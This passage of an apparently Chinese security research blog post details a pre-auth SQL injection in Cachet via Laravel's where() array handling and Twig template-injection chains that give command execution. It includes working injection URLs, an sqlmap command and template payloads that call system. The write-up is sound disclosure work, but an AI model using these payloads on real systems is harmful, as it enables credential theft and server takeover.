+<p>当第一个参数是数组时，将会执行到<code>addArrayOfWheres()</code>方法。另外从上面的第二个if语句也可以看出，这里面对参数<code>$operator</code>做了校验，这也是其无法注入的原因。</p>
+<p>跟进一下<code>addArrayOfWheres()</code>方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">protected</span> <span class="k">function</span> <span class="nf">addArrayOfWheres</span><span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$boolean</span><span class="p">,</span> <span class="nv">$method</span> <span class="o">=</span> <span class="s1">&#39;where&#39;</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whereNested</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$column</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nb">call_user_func_array</span><span class="p">([</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$method</span><span class="p">],</span> <span class="nv">$value</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$query</span><span class="o">-&gt;</span><span class="nv">$method</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">},</span> <span class="nv">$boolean</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="nf">whereNested</span><span class="p">(</span><span class="nx">Closure</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$boolean</span> <span class="o">=</span> <span class="s1">&#39;and&#39;</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">forNestedWhere</span><span class="p">();</span>
+
+    <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addNestedWhereQuery</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$boolean</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>可以观察到，这里面有个很重要的回调，遍历了用户输入的第一个数组参数<code>$column</code>，当发现其键名是一个数字，且键值是一个数组时，将会调用<code>[$query, $method]</code>，也就是<code>$this-&gt;where()</code>，并将完整的<code>$value</code>数组作为参数列表传入。</p>
+<p>这个过程就是为了实现上面说到的<code>where()</code>的第三种用法：</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;dual&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">([</span>
+    <span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;18&#39;</span><span class="p">],</span>
+    <span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;LIKE&#39;</span><span class="p">,</span> <span class="s1">&#39;%example%&#39;</span><span class="p">]</span>
+<span class="p">]);</span>
+</code></pre></div>
+
+<p>所以，通过这个方法，我可以做到了一件事情：<strong>从控制<code>where()</code>的第一个参数，到能够完整控制<code>where()</code>的所有参数</strong>。</p>
+<p>那么，再回看where函数的参数列表：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">public</span> <span class="k">function</span> <span class="nf">where</span><span class="p">(</span><span class="nv">$column</span><span class="p">,</span> <span class="nv">$operator</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$boolean</span> <span class="o">=</span> <span class="s1">&#39;and&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>第四个<code>$boolean</code>参数就格外显眼了，这是控制WHERE条件连接逻辑的参数，默认是and。这个<code>$boolean</code>既不是SQL语句中的“键”，也不是SQL语句中的“值”，而就是SQL语句的代码，如果没有校验，一定存在SQL注入。</p>
+<p>事实证明，这里并没有经过校验。我将debug模式打开，并注释了抑制报错的逻辑，即可在页面上看到SQL注入的报错：</p>
+<p><a href="../media/attachment/2021/08/29/ecbde5be-4927-4985-89da-56c8127c52e3.png"><img alt="image-20210725010451510.png" src="../media/attachment/2021/08/29/ecbde5be-4927-4985-89da-56c8127c52e3.a1b6bf72c212.png" /></a></p>
+<p><code>1[3]</code>参数可以注入任何语句，所以这里存在一个SQL注入漏洞。而且因为这个API接口是GET请求，所以无需用户权限，这是一个无限制的前台SQL注入。</p>
+<p>Laravel的这个数组特性可以类比于6年前我第一次发现的ThinkPHP3系列SQL注入。当时的ThinkPHP注入是我在乌云乃至安全圈站稳脚跟的一批漏洞，它开创了使用数组进行框架ORM注入的先河，其影响和其后续类似的漏洞也一直持续到今天。遗憾的是，Laravel的这个问题是出现在<code>where()</code>的第一个参数，官方并不认为这是框架的问题。</p>
+<h2 id="0x04-sql"><a class="toclink" href="#0x04-sql">0x04 SQL注入利用</a></h2>
+<p>回到Cachet。默认情况下Cachet的任何报错都不会有详情，只会返回一个500错误。且Laravel不支持堆叠注入，那么要利用这个漏洞，就有两种方式：</p>
+<ul>
+<li>通过UNION SELECT注入直接获取数据</li>
+<li>通过BOOL盲注获取数据</li>
+</ul>
+<p>UNION肯定是最理想的，但是这里无法使用，原因是用户的这个输入会经过两次字段数量不同的SQL语句，会导致其中至少有一个SQL语句在UNION SELECT的时候出错而退出。</p>
+<p>Bool盲注没有任何问题，我本地是Postgres数据库，所以以其为例。</p>
+<p>构造一个能够显示数据的请求：</p>
+<div class="codehilite"><pre><span></span><code>http://127.0.0.1:8080/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)+--+
+</code></pre></div>
+
+<p><a href="../media/attachment/2021/08/29/c499a314-b182-4125-b602-d52e64d7b971.png"><img alt="image-20210725012822969.png" src="../media/attachment/2021/08/29/c499a314-b182-4125-b602-d52e64d7b971.6ebb5abeda83.png" /></a></p>
+<p>将and 1=1修改为and 1=2，数据消失了：</p>
+<div class="codehilite"><pre><span></span><code>http://127.0.0.1:8080/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=2)+--+
+</code></pre></div>
+
+<p><a href="../media/attachment/2021/08/29/6e748674-8100-4814-b801-3a195ae57724.png"><img alt="image-20210725012858248.png" src="../media/attachment/2021/08/29/6e748674-8100-4814-b801-3a195ae57724.ebad184da85e.png" /></a></p>
+<p>说明盲注可以利用，于是我选择使用SQLMap来利用漏洞。SQLMap默认情况下将整个参数替换成SQL注入的Payload，而这个注入点需要前缀和后缀，需要对参数进行修改。</p>
+<p>我先使用一个能够爆出数据的URL，比如<code>/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)+--+</code>，在这个括号后面增加个星号，然后作为<code>-u</code>目标进行检测即可：</p>
+<div class="codehilite"><pre><span></span><code>python sqlmap.py -u &quot;http://127.0.0.1:8080/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)*+--+&quot;
+</code></pre></div>
+
+<p><a href="../media/attachment/2021/08/29/e6017e34-010e-4898-a6e2-1be20d4d2e93.png"><img alt="image-20210725023329633.png" src="../media/attachment/2021/08/29/e6017e34-010e-4898-a6e2-1be20d4d2e93.4defaf9ed0b4.png" /></a></p>
+<p>注入点被SQLMap识别了。因为表结构已经知道，成功获取用户、密码：</p>
+<p><a href="../media/attachment/2021/08/29/ea684b00-7397-4499-b88b-0d0f4d95a7d4.png"><img alt="image-20210725015401331.png" src="../media/attachment/2021/08/29/ea684b00-7397-4499-b88b-0d0f4d95a7d4.3fe249b9a8e5.png" /></a></p>
+<h2 id="0x05"><a class="toclink" href="#0x05">0x05 后台代码审计</a></h2>
+<p>这个注入漏洞的优势是无需用户权限，但劣势是无法堆叠执行，原因我在星球的<a href="https://t.zsxq.com/QF2rz7e">这篇帖子</a>里有介绍过（虽然帖子里说的是ThinkPHP）。主要是在初始化PDO的时候设置了<code>PDO::ATTR_EMULATE_PREPARES</code>为false，而数据库默认的参数化查询不允许prepare多个SQL语句。</p>
+<p>无法堆叠执行的结果就是没法执行UPDATE语句，我只能通过注入获取一些信息，想要进一步执行代码，还需要继续审计。</p>
+<p>接下来的审计我主要是在看后台逻辑，挖掘后台漏洞建议是黑盒结合白盒，这样会更快，原因是后台可能有很多常见的敏感操作，比如文件上传、编辑等，这些操作有时候可能直接抓包一改就能测出漏洞，都不需要代码审计了。</p>
+<p>Cachet的后台还算相对安全，没有文件操作的逻辑，唯一一个上传逻辑是“Banner Image”的修改，但并不存在漏洞。</p>
+<p>这时候我关注到了一个功能，Incident Templates，用于在报告事故的时候简化详情填写的操作。这个功能支持解析Twig模板语言：</p>
+<p><a href="../media/attachment/2021/08/29/68847d1d-1031-477e-b18c-b0a69a59d4af.png"><img alt="image-20210725024228754.png" src="../media/attachment/2021/08/29/68847d1d-1031-477e-b18c-b0a69a59d4af.321230a364ef.png" /></a></p>
+<p>对于Twig模板的解析是在API请求中，用API创建或编辑Incident对象的时候会使用到Incident Templates，进而执行模板引擎。</p>
+<p>利用时需要现在Web后台添加一个Incident Template，填写好Twig模板，记下名字。再发送下面这个数据包来执行名为“ssti”的模板，获得结果：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/v1/incidents</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:8080</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">X-Cachet-Token</span><span class="o">:</span> <span class="l">QLGMRm5N8bUjVxbdLF6m</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">42</span>
+
+visible=0&amp;status=1&amp;name=demo&amp;template=ssti
+</code></pre></div>
+
+<p>其中X-Cachet-Token是注入时获取的用户的API Key。我添加了一个内容是<code>{{ 233 * 233 }}</code>的Incident Template，渲染结果被成功返回在API的结果中：</p>
+<p><a href="../media/attachment/2021/08/29/760b6771-a84c-46b7-a3ec-18a245d4c98e.png"><img alt="image-20210725031324953.png" src="../media/attachment/2021/08/29/760b6771-a84c-46b7-a3ec-18a245d4c98e.8875396f5490.png" /></a></p>
+<p>Twig是PHP的一个著名的模板引擎，相比于其他语言的模板引擎，它提供了更安全的沙盒模式。默认模式下模板引擎没有特殊限制，而沙盒模式下只能使用白名单内的tag和filter。</p>
+<p>Cachet中没有使用沙盒模式，所以我不做深入研究。普通模式想要执行恶意代码，需要借助一些内置的tag、filter，或者上下文中的危险对象。在Twig v1.41、v2.10和v3后，增加了<code>map</code>和<code>filter</code>这两个filter，可以直接用来执行任意函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">{{</span><span class="o">[</span><span class="s2">&quot;id&quot;</span><span class="o">]|</span><span class="nf">filter</span><span class="o">(</span><span class="s2">&quot;system&quot;</span><span class="o">)|</span><span class="nf">join</span><span class="o">(</span><span class="s2">&quot;,&quot;</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
+<span class="cp">{{</span><span class="o">[</span><span class="s2">&quot;id&quot;</span><span class="o">]|</span><span class="nf">map</span><span class="o">(</span><span class="s2">&quot;system&quot;</span><span class="o">)|</span><span class="nf">join</span><span class="o">(</span><span class="s2">&quot;,&quot;</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
+</code></pre></div>
+
+<p>但是Cachet v2.3.18中使用的是v1.40.1，刚好不存在这两个filter。那么旧版本如何来利用呢？</p>
+<p>PortSwigger曾在2015年发表过一篇模板注入的文章《<a href="https://portswigger.net/research/server-side-template-injection">Server-Side Template Injection</a>》，里面介绍过当时的Twig模板注入方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">{{</span><span class="nv">_self.env.registerUndefinedFilterCallback</span><span class="o">(</span><span class="s2">&quot;exec&quot;</span><span class="o">)</span><span class="cp">}}{{</span><span class="nv">_self.env.getFilter</span><span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
+</code></pre></div>
+
+<p><code>_self</code>是Twig中的一个默认的上下文对象，指代的是当前Template，其中的<code>env</code>属性是一个<code>Twig_Environment</code>对象。<code>Twig_Environment</code>类的<code>registerUndefinedFilterCallback</code>和<code>getFilter</code>就用来注册和执行回调函数，通过这两次调用，即可构造一个任意命令执行的利用链。</p>
+<p>但是，这个执行命令的方法在Twig v1.20.0中被官方修复了：<a href="https://github.com/twigphp/Twig/blob/1.x/CHANGELOG#L430">https://github.com/twigphp/Twig/blob/1.x/CHANGELOG#L430</a>，修复方法是发现object是当前对象时，则不进行属性的获取，下面这个if语句根本不会进去：</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// object property</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">METHOD_CALL</span> <span class="o">!==</span> <span class="nv">$type</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$object</span> <span class="nx">instanceof</span> <span class="nx">self</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Twig_Template does not have public properties, and we don&#39;t want to allow access to internal ones</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$object</span><span class="o">-&gt;</span><span class="nv">$item</span><span class="p">)</span> <span class="o">||</span> <span class="nb">array_key_exists</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$item</span><span class="p">,</span> <span class="nv">$object</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$isDefinedTest</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">env</span><span class="o">-&gt;</span><span class="na">hasExtension</span><span class="p">(</span><span class="s1">&#39;sandbox&#39;</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">env</span><span class="o">-&gt;</span><span class="na">getExtension</span><span class="p">(</span><span class="s1">&#39;sandbox&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">checkPropertyAllowed</span><span class="p">(</span><span class="nv">$object</span><span class="p">,</span> <span class="nv">$item</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$object</span><span class="o">-&gt;</span><span class="nv">$item</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这个修改逻辑是科学的，因为Twig中正常只允许访问一个对象的public属性和方法，但因为<code>_self</code>指向的是<code>$this</code>，而<code>$this</code>可以访问父类的protected属性，所以才绕过了对作用域的限制，访问到了<code>env</code>。这个修复对此作了加强，让<code>_self</code>的表现和其他对象相同了。</p>
+<p>另外，<code>_self.getEnvironment()</code>原本也可以访问<code>env</code>，这个修复也一起被干掉了。</p>
+<p>Cachet使用<a href="https://github.com/rcrowe/TwigBridge">rcrowe/twigbridge</a>来将twig集成进Laravel框架，按照composer.lock中的版本号来肯定高于v1.20.0（实际是v1.40.1），也就是说，我也无法使用这个Payload做命令执行。</p>
+<h2 id="0x06-twig"><a class="toclink" href="#0x06-twig">0x06 寻找Twig利用链与代码执行</a></h2>
+<p>Cachet中使用了下面这段代码来渲染Twig模板：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">protected</span> <span class="k">function</span> <span class="nf">parseIncidentTemplate</span><span class="p">(</span><span class="nv">$templateSlug</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$vars</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$vars</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="p">}</span>
+
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">twig</span><span class="o">-&gt;</span><span class="na">setLoader</span><span class="p">(</span><span class="k">new</span> <span class="nx">Twig_Loader_String</span><span class="p">());</span>
+    <span class="nv">$template</span> <span class="o">=</span> <span class="nx">IncidentTemplate</span><span class="o">::</span><span class="na">forSlug</span><span class="p">(</span><span class="nv">$templateSlug</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">first</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="nv">$template</span><span class="o">-&gt;</span><span class="na">template</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>其中<code>$vars</code>是用户从POST中传入的一个数组，这意味着注入到模板中的变量只是简单的字符串数组，没有任何对象。再加上前文说到的<code>_self</code>对象也被限制了，我发现很难找到可以被利用的方法。</p>
+<p>此时我关注到了<a href="https://github.com/rcrowe/TwigBridge">rcrowe/twigbridge</a>这个库。rcrowe/twigbridge用于在Laravel和Twig之间建立一个桥梁，让Laravel框架可以直接使用twig模板引擎。</p>
+<p>根据Laravel的依赖注入、控制反转的设计模式，如果要实现“桥梁”的功能，那么就需要编写一个Service Provider，在Service Provider中对目标对象进行初始化，并放在容器中。</p>
+<p>我在rcrowe/twigbridge的ServiceProvider中下了断点，捋了捋Twig初始化的过程，发现一个有趣的点：</p>
+<p><a href="../media/attachment/2021/08/29/aceb2aa6-4a70-4b18-a987-bae57335761c.png"><img alt="image-20210725062730839.png" src="../media/attachment/2021/08/29/aceb2aa6-4a70-4b18-a987-bae57335761c.7b9516917bcc.png" /></a></p>
+<p><code>baseTemplateClass</code>不是默认的<code>\Twig\Template</code>，而是一个自定义的<code>TwigBridge\Twig\Template</code>。<code>baseTemplateClass</code>就是在模板中，<code>_self</code>指向的那个对象的基类，是一个很重要的类。</p>
+<p>在src/Twig/Template.php中，我发现<code>$context</code>中有一个看起来很特殊的对象<code>__env</code>：</p>
+<div class="codehilite"><pre><span></span><code><span class="sd">/**</span>
+<span class="sd"> * {@inheritdoc}</span>
+<span class="sd"> */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="nf">display</span><span class="p">(</span><span class="k">array</span> <span class="nv">$context</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$blocks</span> <span class="o">=</span> <span class="p">[])</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$context</span><span class="p">[</span><span class="s1">&#39;__env&#39;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$context</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">env</span><span class="o">-&gt;</span><span class="na">mergeShared</span><span class="p">(</span><span class="nv">$context</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">shouldFireEvents</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nv">$context</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fireEvents</span><span class="p">(</span><span class="nv">$context</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">parent</span><span class="o">::</span><span class="na">display</span><span class="p">(</span><span class="nv">$context</span><span class="p">,</span> <span class="nv">$blocks</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>在此处下断点可以看到，这个<code>__env</code>是一个<code>\Illuminate\View\Factory</code>对象，原来是Twig共享了Laravel原生View模板引擎中的全局变量。</p>
+<p>那么，我们可以找找<code>\Illuminate\View\Factory</code>类中是否有危险属性和函数。<code>\Illuminate\Events\Dispatcher</code>是Factory类的属性，其中存在一对事件监听函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">public</span> <span class="k">function</span> <span class="nf">listen</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$listener</span><span class="p">,</span> <span class="nv">$priority</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span> <span class="nv">$events</span> <span class="k">as</span> <span class="nv">$event</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">Str</span><span class="o">::</span><span class="na">contains</span><span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setupWildcardListen</span><span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="nv">$listener</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">listeners</span><span class="p">[</span><span class="nv">$event</span><span class="p">][</span><span class="nv">$priority</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">makeListener</span><span class="p">(</span><span class="nv">$listener</span><span class="p">);</span>
+
+            <span class="nb">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sorted</span><span class="p">[</span><span class="nv">$event</span><span class="p">]);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="nf">fire</span><span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="nv">$payload</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$halt</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// ...</span>
+
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getListeners</span><span class="p">(</span><span class="nv">$event</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$listener</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$response</span> <span class="o">=</span> <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$listener</span><span class="p">,</span> <span class="nv">$payload</span><span class="p">);</span>
+</code></pre></div>
+
+<p>它的限制主要是，回调函数必须是一个可以被自动创建与初始化的类方法，比如静态方法。我很快我找到了一对合适的回调<code>\Symfony\Component\VarDumper\VarDumper</code>，我们可以先调用setHandler将<code>$handler</code>设置成任意函数，再调用<code>dump</code>来执行：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">VarDumper</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="nv">$handler</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// ...</span>
+        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$handler</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">setHandler</span><span class="p">(</span><span class="nx">callable</span> <span class="nv">$callable</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$prevHandler</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$handler</span><span class="p">;</span>
+        <span class="nx">self</span><span class="o">::</span><span class="nv">$handler</span> <span class="o">=</span> <span class="nv">$callable</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="nv">$prevHandler</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>构造出的模板代码如下，成功执行任意命令：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">{{</span><span class="nv">__env.getDispatcher</span><span class="o">()</span><span class="nv">.listen</span><span class="o">(</span><span class="s1">&#39;ssti1&#39;</span><span class="o">,</span> <span class="s1">&#39;\\Symfony\\Component\\VarDumper\\VarDumper@setHandler&#39;</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
+<span class="cp">{%</span> <span class="k">set</span> <span class="nv">a</span> <span class="o">=</span> <span class="nv">__env.getDispatcher</span><span class="o">()</span><span class="nv">.fire</span><span class="o">(</span><span class="s1">&#39;ssti1&#39;</span><span class="o">,</span> <span class="o">[</span><span class="s1">&#39;system&#39;</span><span class="o">])</span> <span class="cp">%}</span><span class="x"></span>
+<span class="cp">{{</span><span class="nv">__env.getDispatcher</span><span class="o">()</span><span class="nv">.listen</span><span class="o">(</span><span class="s1">&#39;ssti2&#39;</span><span class="o">,</span> <span class="s1">&#39;\\Symfony\\Component\\VarDumper\\VarDumper@dump&#39;</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
+<span class="cp">{%</span> <span class="k">set</span> <span class="nv">a</span> <span class="o">=</span> <span class="nv">__env.getDispatcher</span><span class="o">()</span><span class="nv">.fire</span><span class="o">(</span><span class="s1">&#39;ssti2&#39;</span><span class="o">,</span> <span class="o">[</span><span class="s1">&#39;ping -n 1 127.0.0.1&#39;</span><span class="o">])</span> <span class="cp">%}</span><span class="x"></span>
+</code></pre></div>
+
+<p><a href="../media/attachment/2021/08/29/ee9acbf6-68fa-418d-bf80-2d03ba03f947.png"><img alt="image-20210725065830156.png" src="../media/attachment/2021/08/29/ee9acbf6-68fa-418d-bf80-2d03ba03f947.33b47c529ad7.png" /></a></p>
+<p>除了<code>__env</code>外，上下文中还被注入了一个<code>app</code>变量，这是一个<code>\Illuminate\Foundation\Application</code>对象，它的利用链就更简单了，因为其中有一个函数可以直接用来执行任意代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">public</span> <span class="k">function</span> <span class="nf">call</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$defaultMethod</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isCallableWithAtSign</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$defaultMethod</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callClass</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$defaultMethod</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$dependencies</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getMethodDependencies</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$dependencies</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>所以，我构造了一个模板代码来执行任意PHP函数，这个方法相对简单很多：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">{{</span> <span class="nv">app.call</span><span class="o">(</span><span class="s1">&#39;md5&#39;</span><span class="o">,</span> <span class="o">[</span><span class="s1">&#39;123456&#39;</span><span class="o">])</span> <span class="cp">}}</span><span class="x"></span>
+</code></pre></div>
+
+<p>至此，我又搞定了后台代码执行。两个漏洞组合起来，就可以成功拿下Cachet系统权限。</p>
+<h2 id="0x07-bug-bounty"><a class="toclink" href="#0x07-bug-bounty">0x07 走向Bug Bounty</a></h2>
+<p>前面说过，国外大量大厂都会使用Statuspage，所以我跑了一下hackerone、bugcrowd中使用了Cachet系统的厂商：</p>
+<p><a href="../media/attachment/2021/08/29/66a7b980-d205-429e-b94c-5cddbe7d64f5.png"><img alt="image-20210720050854635.png" src="../media/attachment/2021/08/29/66a7b980-d205-429e-b94c-5cddbe7d64f5.bd06df2ba9f2.png" /></a></p>
+<p>不多，大部分厂商还是在用Statuspage.io。</p>
